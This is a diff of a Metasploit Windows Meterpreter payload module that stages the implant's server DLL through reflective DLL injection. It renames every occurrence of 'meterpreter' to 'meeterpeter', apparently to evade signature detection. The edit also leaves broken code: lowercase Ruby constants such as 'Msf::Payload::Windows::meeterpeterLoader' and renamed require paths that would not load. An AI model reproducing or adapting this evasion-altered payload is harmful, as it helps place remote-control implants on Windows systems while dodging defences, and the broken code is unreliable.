@@ -5,35 +5,35 @@
 
 
 require 'msf/core'
-require 'msf/core/payload/windows/meterpreter_loader'
-require 'msf/base/sessions/meterpreter_x86_win'
-require 'msf/base/sessions/meterpreter_options'
-require 'rex/payloads/meterpreter/config'
+require 'msf/core/payload/windows/meeterpeter_loader'
+require 'msf/base/sessions/meeterpeter_x86_win'
+require 'msf/base/sessions/meeterpeter_options'
+require 'rex/payloads/meeterpeter/config'
 
 ###
 #
-# Injects the meterpreter server DLL via the Reflective Dll Injection payload
+# Injects the meeterpeter server DLL via the Reflective Dll Injection payload
 # along with transport related configuration.
 #
 ###
 
 module Metasploit4
 
-  include Msf::Payload::Windows::MeterpreterLoader
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Payload::Windows::meeterpeterLoader
+  include Msf::Sessions::meeterpeterOptions
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Meterpreter (Reflective Injection)',
-      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged)',
+      'Name'          => 'Windows meeterpeter (Reflective Injection)',
+      'Description'   => 'Inject the meeterpeter server DLL via the Reflective Dll Injection payload (staged)',
       'Author'        => ['skape','sf'],
       'PayloadCompat' => { 'Convention' => 'sockedi', },
       'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_x86_Win))
+      'Session'       => Msf::Sessions::meeterpeter_x86_Win))
   end
 
   def stage_payload(opts={})
-    stage_meterpreter + generate_config(opts)
+    stage_meeterpeter + generate_config(opts)
   end
 
   def generate_config(opts={})
@@ -50,7 +50,7 @@ module Metasploit4
     }
 
     # create the configuration instance based off the parameters
-    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+    config = Rex::Payloads::meeterpeter::Config.new(config_opts)
 
     # return the binary version of it
     config.to_b
